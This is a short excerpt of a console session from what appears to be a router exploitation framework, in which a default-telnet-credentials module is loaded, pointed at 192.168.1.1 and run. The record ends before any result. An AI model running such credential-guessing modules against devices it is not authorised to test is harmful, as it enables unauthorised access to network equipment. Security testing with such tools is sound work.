...
```
rxf > use creds/routers/netsys/telnet_default_creds
rxf (Netsys Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rxf (Netsys Router Default Telnet Creds) > run
[*] Running module...
